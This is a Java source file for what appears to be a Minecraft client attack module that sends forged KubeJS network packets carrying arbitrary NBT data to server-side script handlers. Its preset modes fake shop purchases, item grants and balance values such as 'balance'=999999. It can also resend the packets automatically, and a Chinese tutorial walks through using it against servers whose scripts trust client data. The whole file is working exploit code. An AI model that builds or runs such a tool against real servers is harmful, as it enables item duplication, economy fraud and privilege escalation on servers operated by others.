package com.redblue.red.modules.kubejs;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.nbt.ListTag;
import net.minecraft.nbt.StringTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * KJS-01: SendDataFromClientMessage — Arbitrary Channel Event Injection.
 *
 * VULN-06 (CONFIRMED via javap):
 * SendDataFromClientMessage.handle() passes raw CompoundTag directly to
 * server-side KubeJS script event handlers (NetworkEvents.DATA_RECEIVED)
 * without any schema validation. The only checks are:
 *   1. channel string is not empty
 *   2. sender is ServerPlayer (from context, not spoofable)
 *   3. DATA_RECEIVED has listeners for the given channel string
 *
 * If server scripts trust event.data without validation (common pattern),
 * attacker can manipulate game state: item duplication, economy exploits,
 * permission escalation, etc.
 *
 * Wire format (Architectury SimpleNetworkManager on Forge):
 *   Vanilla channel: "architectury:network"
 *   Payload: ResourceLocation("kubejs:send_data_from_client")
 *            + String(channel, max 120 chars via writeUtf(120))
 *            + CompoundTag(data)
 */
public class KJS01_DataInject implements AttackModule {

    private static final ResourceLocation ARCH_CHANNEL =
            new ResourceLocation("architectury", "network");
    private static final ResourceLocation MSG_ID =
            new ResourceLocation("kubejs", "send_data_from_client");

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofString("channel", "目标通道名", ""),
        ConfigParam.ofEnum("payload_mode", "载荷模式",
                "CUSTOM", "CUSTOM", "SHOP_EXPLOIT", "GIVE_ITEM", "SET_VALUE"),
        // CUSTOM mode fields
        ConfigParam.ofString("nbt_key", "NBT键名", "data")
                .visibleWhen("payload_mode", "CUSTOM"),
        ConfigParam.ofString("nbt_value", "NBT值", "")
                .visibleWhen("payload_mode", "CUSTOM"),
        // SHOP_EXPLOIT mode fields
        ConfigParam.ofString("item_id", "物品ID", "minecraft:diamond")
                .visibleWhen("payload_mode", "SHOP_EXPLOIT"),
        ConfigParam.ofInt("amount", "数量", 64, -2147483647, 2147483647)
                .visibleWhen("payload_mode", "SHOP_EXPLOIT"),
        ConfigParam.ofInt("price_override", "伪造价格", 0, -999999, 999999)
                .visibleWhen("payload_mode", "SHOP_EXPLOIT"),
        // GIVE_ITEM mode fields
        ConfigParam.ofString("give_item_id", "物品ID", "minecraft:diamond_block")
                .visibleWhen("payload_mode", "GIVE_ITEM"),
        ConfigParam.ofInt("give_count", "数量", 64, 1, 2147483647)
                .visibleWhen("payload_mode", "GIVE_ITEM"),
        // SET_VALUE mode fields
        ConfigParam.ofString("set_key", "键", "balance")
                .visibleWhen("payload_mode", "SET_VALUE"),
        ConfigParam.ofString("set_value", "值", "999999")
                .visibleWhen("payload_mode", "SET_VALUE"),
        // Repeat options
        ConfigParam.ofBool("repeat", "自动重复", false),
        ConfigParam.ofInt("interval", "重复间隔(tick)", 20, 1, 200)
                .visibleWhen("repeat", "true")
    );

    private long lastTick = 0;

    @Override public String id() { return "kjs01_datainject"; }
    @Override public String name() { return "数据注入"; }

    @Override
    public String description() {
        return "向KubeJS脚本事件注入伪造NBT数据";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 输入目标通道名（需要与服务端脚本监听的通道一致）\n"
            + "2. 选择载荷模式：\n"
            + "   - CUSTOM: 自定义NBT键值对\n"
            + "   - SHOP_EXPLOIT: 商店购买伪造（物品/数量/价格）\n"
            + "   - GIVE_ITEM: 物品给予请求伪造\n"
            + "   - SET_VALUE: 键值设置伪造\n"
            + "3. 点击「执行」发送单次，或启用「自动重复」持续发送\n\n"
            + "[原理]\n"
            + "KubeJS的SendDataFromClientMessage将客户端发送的CompoundTag\n"
            + "原样传递给服务端脚本事件处理器，无任何模式验证。\n"
            + "如果脚本信任客户端数据，可导致物品复制、经济操纵等。\n\n"
            + "[注意]\n"
            + "- 通道名必须与服务端脚本监听的通道完全匹配\n"
            + "- 需要服务端安装KubeJS且有对应的网络事件监听器";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("kubejs");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) {
        if (mc.player == null) return;
        String channel = getParam("channel").map(ConfigParam::getString).orElse("");
        if (channel.isEmpty()) return;

        CompoundTag tag = buildPayload();
        sendPacket(channel, tag);
    }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        if (!getParam("repeat").map(ConfigParam::getBool).orElse(false)) return;

        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;

        String channel = getParam("channel").map(ConfigParam::getString).orElse("");
        if (channel.isEmpty()) return;

        CompoundTag tag = buildPayload();
        sendPacket(channel, tag);
    }

    private CompoundTag buildPayload() {
        String mode = getParam("payload_mode").map(ConfigParam::getString).orElse("CUSTOM");
        CompoundTag tag = new CompoundTag();

        switch (mode) {
            case "SHOP_EXPLOIT" -> {
                tag.putString("item",
                    getParam("item_id").map(ConfigParam::getString).orElse("minecraft:diamond"));
                tag.putInt("amount",
                    getParam("amount").map(ConfigParam::getInt).orElse(64));
                tag.putInt("price",
                    getParam("price_override").map(ConfigParam::getInt).orElse(0));
            }
            case "GIVE_ITEM" -> {
                tag.putString("item",
                    getParam("give_item_id").map(ConfigParam::getString)
                        .orElse("minecraft:diamond_block"));
                tag.putInt("count",
                    getParam("give_count").map(ConfigParam::getInt).orElse(64));
            }
            case "SET_VALUE" -> {
                tag.putString("key",
                    getParam("set_key").map(ConfigParam::getString).orElse("balance"));
                tag.putString("value",
                    getParam("set_value").map(ConfigParam::getString).orElse("999999"));
            }
            default -> { // CUSTOM
                String key = getParam("nbt_key").map(ConfigParam::getString).orElse("data");
                String val = getParam("nbt_value").map(ConfigParam::getString).orElse("");
                tag.putString(key, val);
            }
        }
        return tag;
    }

    /**
     * Wire format:
     *   [ResourceLocation: kubejs:send_data_from_client]
     *   [String(120): channel name]
     *   [CompoundTag: data]
     *
     * Sent on vanilla channel "architectury:network".
     */
    private void sendPacket(String channel, CompoundTag data) {
        PacketForge.send(ARCH_CHANNEL, buf -> {
            buf.writeResourceLocation(MSG_ID);
            buf.writeUtf(channel, 120);
            buf.writeNbt(data);
        });
    }
}
